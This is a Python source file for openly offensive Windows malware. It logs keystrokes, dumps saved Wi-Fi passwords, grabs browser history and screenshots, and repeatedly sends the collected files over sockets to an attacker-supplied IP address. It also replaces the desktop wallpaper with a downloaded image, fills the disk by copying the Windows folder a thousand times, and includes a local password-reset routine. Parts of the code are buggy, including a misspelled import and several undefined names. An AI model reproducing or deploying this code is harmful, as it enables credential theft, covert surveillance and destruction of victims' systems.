import os # grabbing the system operating system
import sys # identifying the system-specific parameters and functions
import ctypes #ctypes for wallpaper changes
import time #time can be used for delays and cycle changes
import shutil #copying files
import socket #transfer files via sockets
import urllib.request #Downloading files from web
import pathlib
import subprocess
import json
import sqlite3
import win32crypt
import broswerhistory as bh
from win32com import adsi #for setting password
from PIL import ImageGrab
from PIL import Image 
from multiprocessing import Process



#GLOBAL VARIABLES
dir_path = "C:\WindowsLogs"


#background is to set background of target machine
def background():
    url = "https://raw.githubusercontent.com/kamilgrudzien/JoKEr/main/v33r1.png"
    urllib.request.urlretrieve(url, "C:/WindowsLogs/veer.png")
    #SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/WindowsLogs/veer.png", 0)

#grabs the computer name and IP Address for the PC
def ip_address():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    f = open("Ip_address.txt", "a")
    print("Your attacking Computer Name is:" + hostname, file=f)
    print("Your attacking Computer IP Address is:" + IPAddr, file=f)
    f.close()    

#copies folder
def copy_folder(source,target):
    if os.path.isdir(target):
        print("Folder Exists")
    else:
        shutil.copytree(source, target)
        print("Folder Copied")

#copies files
def copy_file(source,target):
    if os.path.isfile(target):
        print("Files Exists")
    else:
        shutil.copytree(source, target)
        print("Files Copied")
    
#creates directory to store malware data
def dir_create():
    #mode 0o777 allows for permissions to RWE
    if not os.path.isdir(dir_path):
        os.mkdir(dir_path,mode = 0o777)
    else:
        print('The directory is present.')
        
#spins up a server on port 80
#windows firewall catches this action, which we need to bypass
def run_server():
    print('server_running')
    IP = 'Type your IP address to retrieve information from victims'
    PORT = "Choose desired Port"
    ADDR = (IP,PORT)
    Format = "utf-8"
    SIZE = 1000000

    while True:
       
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)

        file = open("C:\\WindowsLogs\\keylogs.txt", "r")
        data = file.read()

        client.send("keylogs.txt".encode(Format))
        msg = client.recv(SIZE).decode(Format)
        #print(f"server: {msg}")

        client.send(data.encode(Format))
        file.close()
        client.close()
    #________________________________________________IP txt NEXT

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)

        file = open("C:\\WindowsLogs\\Ip_address.txt","r")
        data = file.read()

        client.send("Ip_address.txt".encode(Format))
        msg = client.recv(SIZE).decode(Format)
        print(f"server: {msg}")

        client.send(data.encode(Format))
        file.close()
       
        client.close()

    #________________________________________________Browser History

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)

        file = open("C:\\WindowsLogs\\browser.txt","r")
        data = file.read()

        client.send("browser.txt".encode(Format))
        msg = client.recv(SIZE).decode(Format)
        print(f"server: {msg}")

        client.send(data.encode(Format))
        file.close()
       
        client.close()
       

    #_______________________________________________WIFI CREDS
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)

        file = open("C:\\WindowsLogs\\Wifi.txt","r")
        data = file.read()

        client.send("Wifi.txt".encode(Format))
        msg = client.recv(SIZE).decode(Format)
        print(f"server: {msg}")

        client.send(data.encode(Format))
        file.close()
       
        client.close()
        time.sleep(15)
    
#grabs credentials of any connected wifi networks
def wifi_creds():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    f = open("C:/WindowsLogs/WiFi.txt", "a")
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            print ("{:<30}|  {:<}".format(i, results[0]), file=f)
        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""),file=f)
    f.close()
    
def Browser_history(file_path):
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))
    
#Key logger to see all of the user keyboard inputs
def key_logger():
    from pynput.keyboard import Key, Listener
    import logging
    
    f = open("keylogs.txt", "a")
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)a')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()
    f.close()
  
def screencaptures(file_path):
    pathlib.Path('C:/WindowsLogs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'ScreenShots\\'
    
    for x in range(0,5):
        print("screen Captures")
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(2)
    
def set_password(username, password):
    from win32com import adsi
    ads_obj = adsi.ADsGetObject("WinNT://localhost/%s,user" % username)
    ads_obj.Getinfo()
    ads_obj.SetPassword(password)
   
def verify_password_change(username, password):
    from win32security import LogonUser
    from win32con import LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT
    try:
        LogonUser(username, None, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT)
    except:
        return False
    return True

def disk_slammer():
    for i in range(1000):
        new_folder = "C:/" + str(i)
        copy_folder("C:/Windows",new_folder)
    
    

def main():
    from multiprocessing import Process
    multiprocessing.freeze_support() #When testing python script alone comment this out.
    
    p1 = Process(target = key_logger)
    print("Key Logger Running")
    p1.start()
    
    p2 = Process(target = run_server)
    print("Server Running")
    p2.start()
    
    p3 = Process(target = disk_slammer)
    p3.start()
    print("Slamming Disk Resources")
    
    dir_create()
    print("Directory successfully created")
    background()
    print("Wallpaper successfully applied")
    ip_address()
    copy_folder("C:/WindowsLogs/","C:/test/")
    pathlib.Path('C:/WindowsLogs').mkdir(parents=True, exist_ok=True)
    Browser_history(file_path)
     try: 
        win32serviceutil.QueryServiceStatus('WlanSvc')
    except:
        f = open("C:/WindowsLogs/WiFi.txt", "a")
        f.write("Windows Wifi service NOT running/installed")
        f.close()
    else:
        wifi_creds()
    
    #set_password("Test","Password123")
    #if verify_password_change("Test","Password123"):
    #    print("Password Changed Successfully")
    #else:
    #    print("BUSTED CODE")
    
    

if __name__ == "__main__":
    main ()
